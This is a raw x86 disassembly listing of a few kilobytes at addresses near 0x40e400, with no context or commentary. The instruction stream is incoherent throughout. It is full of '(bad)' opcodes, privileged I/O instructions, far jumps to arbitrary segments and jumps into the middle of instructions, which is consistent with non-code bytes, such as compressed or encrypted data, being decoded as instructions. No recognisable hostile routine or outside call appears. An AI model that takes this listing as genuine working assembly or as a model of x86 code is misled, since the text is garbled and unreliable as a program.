  40e42f:	lds    eax,FWORD PTR [ebx+0x41]
  40e432:	and    edx,0x395757bd
  40e438:	adc    eax,0xf8a3c51e
  40e43d:	jno    0x40e422
  40e43f:	int    0x5
  40e441:	adc    edx,esp
  40e443:	test   eax,0x375fecb2
  40e448:	dec    esi
  40e449:	adc    esi,esp
  40e44b:	or     DWORD PTR [esi],esi
  40e44d:	out    0x6e,eax
  40e44f:	xchg   cl,ch
  40e451:	xor    esp,eax
  40e453:	leave  
  40e454:	fsub   QWORD PTR [ebx]
  40e456:	aas    
  40e457:	imul   DWORD PTR [ecx-0x3f0cecc7]
  40e45d:	xor    eax,0xde85db54
  40e462:	aaa    
  40e463:	sub    eax,0xc5f54a94
  40e469:	cmp    BYTE PTR [ebx+0x4d],ch
  40e46c:	adc    eax,0x74045ea3
  40e471:	stos   BYTE PTR es:[edi],al
  40e472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e473:	cmp    ecx,ebx
  40e475:	sbb    al,0xd6
  40e477:	outs   dx,BYTE PTR ds:[esi]
  40e478:	iret   
  40e479:	mov    ecx,0x80ab9ae2
  40e47e:	dec    esi
  40e47f:	mov    edi,0x8f947ad3
  40e484:	or     esp,DWORD PTR [edi+ecx*1]
  40e487:	mov    ebp,0xe7948bd6
  40e48c:	xchg   ebp,eax
  40e48d:	jl     0x40e450
  40e48f:	sar    BYTE PTR [esi-0x3a],0x15
  40e493:	jno    0x40e486
  40e495:	jmp    0x219b:0x64e9d30a
  40e49c:	cdq    
  40e49d:	add    esp,DWORD PTR [ebx-0x68]
  40e4a0:	sbb    BYTE PTR [edx],cl
  40e4a2:	adc    al,0x14
  40e4a4:	icebp  
  40e4a5:	add    al,0xb7
  40e4a8:	(bad)  
  40e4a9:	xor    eax,DWORD PTR [edx+0x6221f6e6]
  40e4af:	pop    esi
  40e4b0:	sub    eax,0x448febe
  40e4b5:	mov    ebp,DWORD PTR [edi]
  40e4b7:	addr16 sub bl,0x59
  40e4bb:	pop    eax
  40e4bc:	inc    eax
  40e4bd:	jno    0x40e4db
  40e4bf:	rol    bh,1
  40e4c1:	mov    bl,0xc1
  40e4c3:	fld    DWORD PTR [esi+0x6]
  40e4c6:	xchg   esi,eax
  40e4c7:	push   ecx
  40e4c8:	sub    cl,0xd7
  40e4cb:	sti    
  40e4cc:	ja     0x40e44e
  40e4ce:	fcomi  st,st(3)
  40e4d0:	shl    DWORD PTR ds:0x4044e6a,1
  40e4d6:	es sbb bh,0xfd
  40e4da:	push   0xffffffef
  40e4dc:	pop    esp
  40e4dd:	test   BYTE PTR [eax-0x59],dh
  40e4e0:	push   es
  40e4e1:	dec    ebx
  40e4e2:	xlat   BYTE PTR ds:[ebx]
  40e4e3:	sahf   
  40e4e4:	repz push 0xffffffbd
  40e4e7:	ja     0x40e499
  40e4e9:	mov    ebx,0x60d57a93
  40e4ee:	mov    esi,0x67cedf92
  40e4f3:	inc    eax
  40e4f4:	push   esp
  40e4f5:	test   BYTE PTR [eax],bh
  40e4f7:	scas   al,BYTE PTR es:[edi]
  40e4f8:	adc    edx,DWORD PTR [esi+0x23e71063]
  40e4fe:	xchg   ebx,eax
  40e4ff:	jmp    0x40e4b0
  40e501:	pusha  
  40e502:	les    eax,FWORD PTR [edi-0x7529e222]
  40e508:	nop
  40e509:	iret   
  40e50a:	sub    al,0x2d
  40e50c:	data16 loope 0x40e4a7
  40e50f:	push   ecx
  40e510:	mov    dl,0xa7
  40e512:	pop    DWORD PTR [ecx*4-0x6762e6b8]
  40e519:	mov    cl,0x3c
  40e51b:	hlt    
  40e51c:	inc    ecx
  40e51d:	loope  0x40e50c
  40e51f:	test   esi,edx
  40e521:	mov    al,BYTE PTR [edx]
  40e523:	dec    esi
  40e524:	push   es
  40e525:	dec    eax
  40e526:	iret   
  40e527:	mov    ecx,0x16da3ca4
  40e52c:	jns    0x40e529
  40e52e:	push   ds
  40e52f:	call   0x2ce1:0xb8c94ed2
  40e536:	adc    eax,0xe4a46026
  40e53b:	fldcw  WORD PTR [ebx]
  40e53d:	(bad)  
  40e53e:	mov    al,ds:0x67dad462
  40e543:	arpl   WORD PTR [ebp+0x7aef9177],si
  40e549:	ds pop edi
  40e54b:	adc    dh,BYTE PTR [esi]
  40e54d:	xor    al,0x98
  40e54f:	adc    eax,0x8610d145
  40e554:	outs   dx,DWORD PTR ds:[esi]
  40e555:	add    cl,cl
  40e557:	inc    ebx
  40e558:	shl    BYTE PTR [ecx-0x5a],1
  40e55b:	xor    eax,0x9c56f873
  40e560:	mov    eax,0xda4e2aef
  40e565:	imul   ebp,DWORD PTR [ebp+ebp*8-0x356c9968],0xffffff9c
  40e56d:	mov    DWORD PTR [esi+0x50f5558a],0x297faff3
  40e577:	cwde   
  40e578:	mov    edi,0xeb5c6632
  40e57d:	(bad)  
  40e57e:	(bad)  
  40e57f:	cmp    DWORD PTR [ebp+edx*1-0x4],ecx
  40e583:	or     eax,0x9a56d6b6
  40e588:	mov    WORD PTR [ecx+0x13],ss
  40e58b:	data16 xchg ah,dh
  40e58e:	shl    DWORD PTR [edi+eiz*8+0x671e8b65],1
  40e595:	ficom  WORD PTR [ebx-0x6d]
  40e598:	or     BYTE PTR [edx+0x13],dh
  40e59b:	add    ecx,DWORD PTR [eax-0x29]
  40e59e:	or     dh,BYTE PTR [ebp-0x6c74bab7]
  40e5a4:	dec    edx
  40e5a5:	cld    
  40e5a6:	jmp    0xc2074bb3
  40e5ab:	ja     0x40e5f6
  40e5ad:	les    ecx,FWORD PTR [esi]
  40e5af:	(bad)  
  40e5b0:	and    eax,0x56bcb0cb
  40e5b5:	sbb    ah,bl
  40e5b7:	aad    0x5e
  40e5b9:	sbb    ecx,DWORD PTR [edx-0x5d]
  40e5bc:	cli    
  40e5bd:	pop    esi
  40e5be:	mov    cl,BYTE PTR [esi+0x483367]
  40e5c4:	(bad)  
  40e5c5:	daa    
  40e5c6:	xchg   ebp,eax
  40e5c7:	inc    edi
  40e5c8:	das    
  40e5c9:	lods   al,BYTE PTR ds:[esi]
  40e5ca:	push   esi
  40e5cb:	iret   
  40e5cc:	xor    BYTE PTR [edi],bh
  40e5ce:	sbb    eax,0x9a50a18f
  40e5d3:	sar    BYTE PTR [edi],0x50
  40e5d6:	dec    ecx
  40e5d7:	xchg   ebx,eax
  40e5d8:	or     al,0x88
  40e5da:	mov    esp,0xd91feddd
  40e5df:	loope  0x40e657
  40e5e1:	push   edx
  40e5e2:	(bad)  
  40e5e4:	dec    edi
  40e5e5:	sbb    eax,0x96d0b800
  40e5ea:	mov    al,ds:0xd8490ae1
  40e5ef:	in     eax,dx
  40e5f0:	int3   
  40e5f1:	jmp    FWORD PTR [ecx+0x5f]
  40e5f4:	sbb    BYTE PTR [eax-0x6b],0x98
  40e5f8:	cmp    ch,BYTE PTR [esi-0x7d]
  40e5fb:	mov    bh,0xc
  40e5fd:	fsub   QWORD PTR ds:[ebx]
  40e600:	in     eax,dx
  40e601:	ins    BYTE PTR es:[edi],dx
  40e602:	mov    ch,BYTE PTR [ecx+0x6d]
  40e605:	pop    ebp
  40e606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e607:	(bad)  
  40e608:	retfw  0x6e35
  40e60c:	enter  0x84a,0x65
  40e610:	and    ecx,edx
  40e612:	(bad)  
  40e613:	push   0xc0390bbf
  40e618:	jge    0x40e61d
  40e61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61b:	dec    esp
  40e61c:	mov    bl,0xc
  40e61e:	sahf   
  40e61f:	ss repnz popf 
  40e622:	xchg   ecx,eax
  40e623:	(bad)  
  40e624:	fst    st(5)
  40e626:	outs   dx,BYTE PTR ds:[esi]
  40e627:	mov    ds:0x42baa689,eax
  40e62c:	fs adc al,0x76
  40e62f:	inc    edi
  40e630:	push   0x54
  40e632:	aad    0x9b
  40e634:	loop   0x40e672
  40e636:	inc    esp
  40e637:	and    BYTE PTR ds:0x1a06085c,bh
  40e63d:	and    DWORD PTR [edx+0xe],0xfd5f9
  40e644:	mov    WORD PTR [ebp-0x2e5ede7],fs
  40e64a:	scas   eax,DWORD PTR es:[edi]
  40e64b:	sub    ebp,DWORD PTR [ebx]
  40e64d:	cdq    
  40e64e:	adc    bh,BYTE PTR [edx+0x61]
  40e651:	in     eax,0x18
  40e653:	inc    edx
  40e654:	out    dx,al
  40e655:	mov    al,0x9b
  40e657:	shl    BYTE PTR [ebx-0x254635a4],0x31
  40e65e:	in     al,dx
  40e65f:	mov    es,WORD PTR [ecx]
  40e661:	sar    DWORD PTR [ebp+0x74],cl
  40e664:	add    esi,DWORD PTR [edx-0x54bb8b84]
  40e66a:	test   al,0xa2
  40e66d:	sbb    DWORD PTR [ecx+0x48],esi
  40e670:	test   DWORD PTR [eax+edi*8-0x35edcefe],esp
  40e677:	dec    edi
  40e678:	and    ebp,DWORD PTR [esi+0x6d8b40d8]
  40e67e:	push   es
  40e67f:	xchg   DWORD PTR [eax],ebp
  40e681:	adc    al,0x60
  40e684:	es int3 
  40e686:	sub    esi,DWORD PTR cs:[esi]
  40e689:	mov    dl,0xa4
  40e68c:	push   esi
  40e68d:	push   0xb1184149
  40e692:	int3   
  40e693:	out    dx,al
  40e694:	and    DWORD PTR [ebp+0xa],ecx
  40e697:	aas    
  40e698:	or     esi,DWORD PTR [ecx]
  40e69a:	leave  
  40e69b:	push   es
  40e69c:	outs   dx,DWORD PTR ds:[esi]
  40e69d:	inc    esi
  40e69e:	xchg   DWORD PTR [edx-0x63878666],esi
  40e6a4:	outs   dx,DWORD PTR ds:[esi]
  40e6a5:	adc    BYTE PTR [edi-0x42b21eba],bh
  40e6ab:	bound  esi,QWORD PTR [eax-0xc4a4c17]
  40e6b1:	mov    ?,WORD PTR [ebx+0x6c]
  40e6b4:	or     esp,esi
  40e6b6:	fwait
  40e6b7:	jo     0x40e6be
  40e6b9:	sti    
  40e6ba:	imul   DWORD PTR [eax-0x6d]
  40e6bd:	dec    esi
  40e6be:	mov    al,ds:0x42c5c3f3
  40e6c3:	push   cs
  40e6c4:	push   edx
  40e6c5:	test   DWORD PTR [edx],edi
  40e6c7:	add    DWORD PTR [edi+0x29],edi
  40e6ca:	repnz push ebx
  40e6cc:	mov    BYTE PTR [ebp+0x30],dl
  40e6cf:	loope  0x40e6b4
  40e6d1:	int3   
  40e6d2:	cmc    
  40e6d3:	sbb    dh,0x55
  40e6d6:	cmp    DWORD PTR [eax],edx
  40e6d8:	rcl    BYTE PTR fs:[edi+0x47],cl
  40e6dc:	in     eax,0xa3
  40e6de:	arpl   WORD PTR [edi],sp
  40e6e0:	push   esp
  40e6e1:	and    al,0x5c
  40e6e3:	les    ebx,FWORD PTR [ebx]
  40e6e5:	push   ds
  40e6e6:	ins    BYTE PTR es:[edi],dx
  40e6e7:	or     eax,0x430d7da3
  40e6ec:	std    
  40e6ed:	pop    ecx
  40e6ee:	jp     0x40e714
  40e6f0:	fistp  DWORD PTR [ebp-0x7e]
  40e6f3:	sub    DWORD PTR [ebx],0xe06fb730
  40e6f9:	ss add ch,bl
  40e6fc:	adc    DWORD PTR [ebp+0x2],edi
  40e6ff:	aas    
  40e700:	add    DWORD PTR [edi-0x35a61f75],0xffffffbf
  40e707:	icebp  
  40e708:	mov    edx,0x69af9349
  40e70d:	xor    edi,esi
  40e70f:	jmp    0xa3b2:0x597351cb
  40e716:	xor    bh,bl
  40e718:	in     al,0x71
  40e71a:	mov    edi,0xc0fa3f2
  40e71f:	mov    es,WORD PTR [edi-0x3f]
  40e722:	fistp  WORD PTR [eax]
  40e724:	adc    eax,0x7c565a15
  40e729:	jmp    0x40e73e
  40e72b:	(bad)  
  40e72d:	dec    ebx
  40e72e:	lds    esp,FWORD PTR [ebx+edi*1+0x42]
  40e732:	inc    edi
  40e733:	dec    edx
  40e734:	xchg   ebx,eax
  40e735:	(bad)  
  40e736:	std    
  40e737:	ret    0x8757
  40e73a:	scas   al,BYTE PTR es:[edi]
  40e73b:	add    al,cl
  40e73d:	cmp    al,0x1e
  40e73f:	pop    DWORD PTR [eax+edi*2+0x732f9176]
  40e746:	pop    edx
  40e747:	cmp    eax,0x97efa0b0
  40e74c:	js     0x40e73a
  40e74e:	pusha  
  40e74f:	push   es
  40e750:	adc    BYTE PTR [eax+ecx*1-0x60],0x2b
  40e755:	xor    DWORD PTR [esi+0x1cd64f39],eax
  40e75b:	or     bh,cl
  40e75d:	sbb    esi,esp
  40e75f:	fdivr  QWORD PTR [ebx]
  40e761:	nop
  40e762:	repz aaa 
  40e764:	(bad)  
  40e765:	dec    esp
  40e766:	test   bh,dl
  40e768:	dec    ebx
  40e769:	push   ebp
  40e76a:	retf   
  40e76b:	mov    cl,0xf5
  40e76d:	xchg   edi,eax
  40e76e:	cmc    
  40e76f:	call   0xdac3555a
  40e774:	xchg   BYTE PTR [ecx],bl
  40e776:	xchg   esi,eax
  40e777:	dec    esp
  40e778:	sbb    DWORD PTR [edx+eiz*4],0xf7eb8abb
  40e77f:	dec    edx
  40e780:	cs mov bl,0x68
  40e783:	mov    eax,DWORD PTR [eax+0x65dc3113]
  40e789:	sahf   
  40e78a:	add    esi,esi
  40e78c:	xor    DWORD PTR [ebx+0x5a],esi
  40e78f:	fwait
  40e790:	push   edi
  40e791:	stos   DWORD PTR es:[edi],eax
  40e792:	(bad)  ds:0x65017037
  40e798:	dec    ecx
  40e799:	fsub   QWORD PTR [esp+eax*1+0x58]
  40e79d:	push   esp
  40e79e:	in     al,dx
  40e79f:	or     bl,ch
  40e7a1:	scas   al,BYTE PTR es:[edi]
  40e7a2:	jns    0x40e729
  40e7a4:	std    
  40e7a5:	mov    ah,0x19
  40e7a7:	call   0x422a:0xd56d93fc
  40e7ae:	test   ecx,esp
  40e7b0:	sbb    BYTE PTR [eax-0x11],dh
  40e7b3:	xchg   ebx,eax
  40e7b4:	fwait
  40e7b5:	xor    bl,BYTE PTR [eax-0x58bf2c23]
  40e7bb:	leave  
  40e7bc:	cmp    cl,0x68
  40e7bf:	mov    eax,0x96419fdb
  40e7c4:	call   0x2255:0xfd62bf26
  40e7cb:	inc    esp
  40e7cc:	inc    ecx
  40e7cd:	sahf   
  40e7ce:	fs inc ebp
  40e7d0:	add    eax,0x1253dae3
  40e7d5:	sub    eax,0xe4063163
  40e7da:	fmul   st,st(3)
  40e7dc:	or     DWORD PTR ds:0x7a9e5434,0x2f
  40e7e3:	scas   eax,DWORD PTR es:[edi]
  40e7e4:	fsubr  QWORD PTR [ebp-0x6c788f16]
  40e7ea:	inc    ebp
  40e7eb:	push   es
  40e7ec:	xor    DWORD PTR [ebx-0x6d6ac18c],ebp
  40e7f2:	sbb    al,bl
  40e7f4:	or     bh,dl
  40e7f6:	nop
  40e7f7:	popf   
  40e7f8:	fwait
  40e7f9:	push   es
  40e7fa:	mov    ah,0x70
  40e7fc:	jge    0x40e80c
  40e7fe:	mov    edx,0x1627f197
  40e803:	pop    eax
  40e804:	pop    ds
  40e805:	(bad)  
  40e806:	pop    eax
  40e807:	stos   BYTE PTR es:[edi],al
  40e808:	lds    edx,FWORD PTR [ebx-0x51]
  40e80b:	sbb    BYTE PTR [esi],dl
  40e80d:	stos   DWORD PTR es:[edi],eax
  40e80e:	or     ch,0x46
  40e811:	or     BYTE PTR ds:0x8c1196f,bl
  40e817:	icebp  
  40e818:	lods   eax,DWORD PTR ds:[esi]
  40e819:	mov    DWORD PTR [ecx-0x52],ebx
  40e81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e81d:	dec    ecx
  40e81e:	mov    DWORD PTR [eax],edi
  40e820:	lock daa 
  40e822:	cmp    DWORD PTR [esi-0x730caf71],ecx
  40e828:	mov    bl,0xf8
  40e82a:	adc    DWORD PTR [ecx+ebx*1-0x7bf314c2],0x1e
  40e832:	xor    DWORD PTR [edi],esp
  40e834:	(bad)  
  40e835:	ss es adc eax,0x86e67023
  40e83c:	inc    ebp
  40e83d:	lea    ebp,[edi-0x5a560bd7]
  40e843:	push   esi
  40e844:	add    edx,0xffffff98
  40e847:	mov    dh,0xfb
  40e849:	cmp    ah,dh
  40e84b:	ja     0x40e800
  40e84d:	repnz xchg esi,eax
  40e84f:	pop    es
  40e850:	adc    dl,ch
  40e852:	mov    BYTE PTR [ebp+eiz*8-0x7ef006b8],ah
  40e859:	in     al,dx
  40e85a:	add    ch,BYTE PTR [eax+0x46]
  40e85d:	xchg   DWORD PTR [eax+0x242183e5],ebp
  40e863:	adc    eax,0x757925c7
  40e868:	cmp    al,0x9f
  40e86a:	push   esp
  40e86b:	push   edi
  40e86c:	fld    TBYTE PTR [edi+eiz*4-0x1129e3d9]
  40e873:	repnz aaa 
  40e875:	jmp    0x2c27:0x64cad4b1
  40e87c:	xchg   BYTE PTR [ecx+0x55],bh
  40e87f:	mov    eax,0xc2d7d343
  40e884:	arpl   WORD PTR [edi-0x68],ax
  40e887:	into   
  40e888:	popf   
  40e889:	or     DWORD PTR [edx+0x4b],ebx
  40e88c:	sub    al,0xf9
  40e88e:	icebp  
  40e88f:	mov    esp,0xcf505102
  40e894:	out    0x12,al
  40e896:	ficomp WORD PTR [edx+0x60]
  40e899:	shl    DWORD PTR [ecx-0x5309961b],0xdc
  40e8a0:	and    ebp,DWORD PTR [ecx]
  40e8a2:	je     0x40e8d3
  40e8a4:	dec    ecx
  40e8a5:	inc    edx
  40e8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8a7:	adc    eax,0x19099132
  40e8ac:	dec    eax
  40e8ad:	(bad)  
  40e8ae:	frstor [edx+0x4b]
  40e8b1:	nop
  40e8b2:	cmp    ecx,DWORD PTR [eax+0x6c03d4f8]
  40e8b8:	ret    0xf019
  40e8bb:	fimul  WORD PTR [ebx-0x17fb9437]
  40e8c1:	mov    ch,0xae
  40e8c3:	sar    BYTE PTR [ebp-0x3e5868e9],cl
  40e8c9:	test   BYTE PTR [ebx+0x26],ch
  40e8cc:	xchg   cl,al
  40e8ce:	mov    edx,0x299c858f
  40e8d3:	(bad)  
  40e8d4:	dec    edi
  40e8d5:	ret    
  40e8d6:	aam    0x2
  40e8d8:	ret    0x49bb
  40e8db:	ins    BYTE PTR es:[edi],dx
  40e8dc:	(bad)  
  40e8dd:	out    0xed,al
  40e8df:	or     cl,bh
  40e8e1:	sub    eax,0x33808ae6
  40e8e6:	adc    al,0x82
  40e8e8:	es nop
  40e8ea:	xchg   ebx,eax
  40e8eb:	jp     0x40e922
  40e8ed:	xor    dl,cl
  40e8ef:	in     al,0x5b
  40e8f1:	fild   DWORD PTR [ecx]
  40e8f3:	mov    dh,0xbb
  40e8f5:	mov    bl,0x21
  40e8f7:	scas   al,BYTE PTR es:[edi]
  40e8f8:	rcl    BYTE PTR [esi+0x62],0x54
  40e8fc:	das    
  40e8fd:	mov    al,0x33
  40e8ff:	mov    eax,ds:0x70297864
  40e904:	jo     0x40e8c3
  40e906:	jo     0x40e977
  40e908:	gs pop es
  40e90a:	and    al,0x97
  40e90c:	sub    al,0x1c
  40e90e:	in     al,dx
  40e90f:	rol    DWORD PTR [edi-0x41fd0f61],cl
  40e915:	add    dl,al
  40e917:	icebp  
  40e918:	inc    ebp
  40e919:	inc    esp
  40e91a:	clc    
  40e91b:	mov    ebp,0x22135ab9
  40e920:	sar    DWORD PTR [eax-0x12],cl
  40e923:	outs   dx,DWORD PTR ds:[esi]
  40e924:	loop   0x40e98e
  40e926:	jmp    0x4eb5:0x1eb2a0ee
  40e92d:	sub    al,BYTE PTR [edx-0x2e]
  40e930:	loop   0x40e99a
  40e932:	or     ebx,eax
  40e934:	cmp    eax,0x2e433581
  40e939:	sub    DWORD PTR [eax],ebx
  40e93b:	gs and bh,al
  40e93e:	int3   
  40e93f:	adc    edi,DWORD PTR [edi+0x7f7d3774]
  40e945:	or     cl,ah
  40e947:	jecxz  0x40e8ee
  40e949:	push   ebp
  40e94a:	mov    edx,0xd71912b
  40e94f:	ficom  DWORD PTR [edx+0x58ef3faf]
  40e955:	and    edx,ecx
  40e957:	sbb    eax,ebx
  40e959:	sbb    ebp,eax
  40e95b:	mov    ds:0x7f24f300,al
  40e960:	adc    bh,0x68
  40e963:	leave  
  40e964:	pop    esi
  40e965:	out    dx,eax
  40e966:	icebp  
  40e967:	sub    eax,DWORD PTR [ebp+eiz*8+0x45]
  40e96b:	push   esp
  40e96c:	imul   eax,DWORD PTR [ecx+0x1227584],0xa5284c64
  40e976:	shr    bh,cl
  40e978:	pop    ebp
  40e979:	sub    al,0x96
  40e97b:	jmp    0xfcb09873
  40e980:	jle    0x40e9e1
  40e982:	lods   eax,DWORD PTR ds:[esi]
  40e983:	xor    eax,0xd258b6b5
  40e988:	pop    edx
  40e989:	adc    al,0x39
  40e98b:	out    0x74,eax
  40e98d:	gs pop es
  40e98f:	js     0x40e944
  40e991:	dec    esp
  40e992:	push   esi
  40e993:	fistp  QWORD PTR [eax-0x4c]
  40e996:	xchg   edx,eax
  40e997:	cmc    
  40e998:	mov    dh,0x59
  40e99a:	arpl   WORD PTR [edx-0x2c9c6a17],bp
  40e9a0:	cld    
  40e9a1:	jnp    0x40ea04
  40e9a3:	lods   eax,DWORD PTR ds:[esi]
  40e9a4:	call   0xe4855fe5
  40e9a9:	xchg   ebp,eax
  40e9aa:	fcom   DWORD PTR [eax+0x4c2ad88b]
  40e9b0:	scas   eax,DWORD PTR es:[edi]
  40e9b1:	shl    DWORD PTR [esp+ebx*4+0x7d],1
  40e9b5:	mov    ecx,0x10592a0e
  40e9ba:	and    al,0xc6
  40e9bc:	xchg   edx,eax
  40e9bd:	mov    edi,0xda69f33f
  40e9c2:	out    dx,al
  40e9c3:	push   esi
  40e9c4:	xlat   BYTE PTR ds:[ebx]
  40e9c5:	jnp    0x40e957
  40e9c7:	mov    eax,0x50ce127b
  40e9cc:	cmp    ah,ch
  40e9ce:	stos   BYTE PTR es:[edi],al
  40e9cf:	xchg   ecx,eax
  40e9d0:	jle    0x40ea04
  40e9d2:	ficom  WORD PTR [edi+0x38fc34ee]
  40e9d8:	xlat   BYTE PTR ds:[ebx]
  40e9d9:	icebp  
  40e9da:	aam    0xed
  40e9dc:	mov    edi,0xa915cb22
  40e9e1:	loope  0x40e99a
  40e9e3:	push   cs
  40e9e4:	in     eax,dx
  40e9e5:	daa    
  40e9e6:	mov    ds:0x2342e047,al
  40e9eb:	or     al,0x69
  40e9ed:	lahf   
  40e9ee:	ret    
  40e9ef:	inc    eax
  40e9f0:	jl     0x40e9e7
  40e9f2:	mov    ebp,0x49eaeedc
  40e9f7:	shl    BYTE PTR [edx+ebp*2],0x6f
  40e9fb:	fdivr  QWORD PTR [esi]
  40e9fd:	test   eax,0x340a468f
  40ea02:	xor    eax,0xe8cb957d
  40ea07:	xchg   esp,eax
  40ea08:	cmp    bl,BYTE PTR [edx-0x7b]
  40ea0b:	mov    WORD PTR [ebx+0x7daa585b],?
  40ea11:	cdq    
  40ea12:	dec    esp
  40ea13:	jmp    0xe09418d8
  40ea18:	out    0x74,eax
  40ea1a:	push   ss
  40ea1b:	xor    al,0x7d
  40ea1d:	jb     0x40ea62
  40ea1f:	idiv   edx
  40ea21:	mov    al,0x8d
  40ea23:	jo     0x40e9f5
  40ea25:	jmp    0xfd29889b
  40ea2a:	lods   eax,DWORD PTR ds:[esi]
  40ea2b:	pop    esp
  40ea2c:	fs sahf 
  40ea2e:	std    
  40ea2f:	adc    ebp,DWORD PTR [edx+0x68155652]
  40ea35:	sbb    BYTE PTR [esi+0x322d76c1],ch
  40ea3b:	pop    ebp
  40ea3c:	(bad)  
  40ea3d:	mov    ebx,0xe8f0f92d
  40ea42:	shl    BYTE PTR [eax+0x4fb5c187],0x93
  40ea49:	dec    ebx
  40ea4a:	push   0xffffff9c
  40ea4c:	out    0xc8,al
  40ea4e:	push   edx
  40ea4f:	push   0xffffffa9
  40ea51:	out    dx,eax
  40ea52:	sbb    al,0x4f
  40ea54:	push   es
  40ea55:	aam    0xf4
  40ea57:	aam    0x5e
  40ea59:	mov    al,0x36
  40ea5b:	jle    0x40ea48
  40ea5d:	jo     0x40eadd
  40ea5f:	jnp    0x40ea03
  40ea61:	in     eax,0xc7
  40ea63:	adc    al,0xdc
  40ea65:	scas   al,BYTE PTR es:[edi]
  40ea66:	out    dx,al
  40ea67:	or     edi,DWORD PTR [edx]
  40ea69:	(bad)  
  40ea6a:	mov    eax,0x80be751
  40ea6f:	xchg   ecx,eax
  40ea70:	inc    esp
  40ea71:	pop    eax
  40ea72:	adc    edi,DWORD PTR [esi-0xa4bf9d3]
  40ea78:	cmp    al,0x1
  40ea7a:	add    DWORD PTR [edi],esi
  40ea7c:	retf   
  40ea7d:	leave  
  40ea7e:	mov    edx,0x7d26c746
  40ea83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea84:	lods   eax,DWORD PTR ds:[esi]
  40ea85:	and    cl,bl
  40ea87:	mov    eax,0xbac2e919
  40ea8c:	mov    dl,al
  40ea8e:	out    0x8f,eax
  40ea90:	nop
  40ea91:	lods   al,BYTE PTR ds:[esi]
  40ea92:	mov    ds:0x9e194886,eax
  40ea97:	test   cl,bl
  40ea99:	xor    ebx,DWORD PTR [ebp+0x55]
  40ea9c:	gs scas al,BYTE PTR es:[edi]
  40ea9e:	xchg   ecx,eax
  40ea9f:	in     eax,dx
  40eaa0:	mov    bh,0x82
  40eaa2:	aad    0xe7
  40eaa4:	cdq    
  40eaa5:	xlat   BYTE PTR ds:[ebx]
  40eaa6:	nop
  40eaa7:	mov    dh,0x16
  40eaa9:	cmc    
  40eaaa:	or     al,0x29
  40eaac:	je     0x40eab3
  40eaae:	adc    ebp,DWORD PTR [bx+di]
  40eab1:	std    
  40eab2:	int    0x38
  40eab4:	frndint 
  40eab6:	loope  0x40eac4
  40eab8:	retf   0x601c
  40eabb:	xchg   edi,eax
  40eabc:	iret   
  40eabd:	in     eax,dx
  40eabe:	aaa    
  40eabf:	sub    bl,dh
  40eac1:	retf   
  40eac2:	add    ecx,DWORD PTR [esi]
  40eac4:	imul   esp,DWORD PTR [eax],0x61d2d9d4
  40eaca:	pop    ds
  40eacb:	jg     0x40ea85
  40eacd:	fs sbb ebx,edx
  40ead0:	jge    0x40eb38
  40ead2:	not    ecx
  40ead4:	or     al,cl
  40ead6:	push   ds
  40ead7:	or     BYTE PTR ds:0x53b0df2d,dh
  40eadd:	popa   
  40eade:	adc    eax,0x4797fe9b
  40eae3:	hlt    
  40eae4:	in     eax,0x27
  40eae6:	pop    esi
  40eae7:	cwde   
  40eae8:	and    eax,0xbd0da8d4
  40eaed:	aad    0xfb
  40eaef:	adc    al,0x70
  40eaf1:	popf   
  40eaf2:	mov    esi,0x7a185132
  40eaf7:	rcr    bh,0x16
  40eafa:	pop    ecx
  40eafb:	pop    eax
  40eafc:	popa   
  40eafd:	pop    esp
  40eafe:	mov    ds:0xd2973d58,al
  40eb03:	xchg   edx,eax
  40eb04:	repz xchg esp,eax
  40eb06:	fbstp  TBYTE PTR [eax]
  40eb08:	dec    edx
  40eb09:	scas   al,BYTE PTR es:[edi]
  40eb0a:	xor    eax,esp
  40eb0c:	mov    cl,0x39
  40eb0e:	jnp    0x40eae2
  40eb10:	sbb    BYTE PTR [ebx-0x5a],bl
  40eb13:	(bad)  
  40eb14:	fdiv   DWORD PTR [edi-0x1a]
  40eb17:	inc    ebp
  40eb18:	xor    dl,dl
  40eb1a:	mov    edx,0x78b96d08
  40eb1f:	cs pop ds
  40eb21:	xchg   edx,eax
  40eb22:	int3   
  40eb23:	repz into 
  40eb25:	jne    0x40eade
  40eb27:	xchg   DWORD PTR ds:0x458ffd20,eax
  40eb2d:	push   es
  40eb2e:	aaa    
  40eb2f:	(bad)  
  40eb30:	pop    esi
  40eb31:	loopne 0x40eb2b
  40eb33:	out    0x40,al
  40eb35:	inc    ebp
  40eb36:	cmp    ch,BYTE PTR [ebp+0x6a]
  40eb39:	push   esi
  40eb3a:	lea    edi,[eax*2+0x58fde433]
  40eb41:	xchg   ebp,eax
  40eb42:	dec    edx
  40eb43:	sub    DWORD PTR [edi],edx
  40eb45:	out    0x2b,al
  40eb47:	sbb    ebx,DWORD PTR [eax+eiz*4+0x56]
  40eb4b:	retf   0xe68a
  40eb4e:	xor    BYTE PTR [esi-0xd],al
  40eb51:	xor    al,0x67
  40eb53:	imul   esp,eax,0xffffffc8
  40eb56:	les    ebx,FWORD PTR gs:[edi+0x5277f29f]
  40eb5d:	outs   dx,DWORD PTR ds:[esi]
  40eb5e:	imul   ebx,ebp,0xffffffbf
  40eb61:	ins    DWORD PTR es:[edi],dx
  40eb62:	loope  0x40eb71
  40eb64:	jge    0x40eb43
  40eb66:	dec    edi
  40eb67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb68:	and    BYTE PTR ds:0x89717889,dh
  40eb6e:	inc    esi
  40eb70:	aam    0x48
  40eb72:	sub    al,0x6
  40eb74:	sub    al,BYTE PTR [ebx-0x31]
  40eb77:	dec    ecx
  40eb78:	xor    al,BYTE PTR [ebx-0x47]
  40eb7b:	jns    0x40eb7b
  40eb7d:	cli    
  40eb7e:	outs   dx,DWORD PTR ds:[esi]
  40eb7f:	je     0x40ebb2
  40eb81:	aam    0xd6
  40eb83:	gs pop eax
  40eb85:	push   edi
  40eb86:	loopne 0x40ec04
  40eb88:	dec    ecx
  40eb89:	mov    bh,0x1f
  40eb8b:	jne    0x40eb48
  40eb8d:	repnz pop ebp
  40eb8f:	mov    dh,0x2b
  40eb91:	sbb    BYTE PTR [eax],al
  40eb93:	push   es
  40eb94:	ins    DWORD PTR es:[edi],dx
  40eb95:	sbb    eax,0xa4958937
  40eb9a:	loopne 0x40ebdd
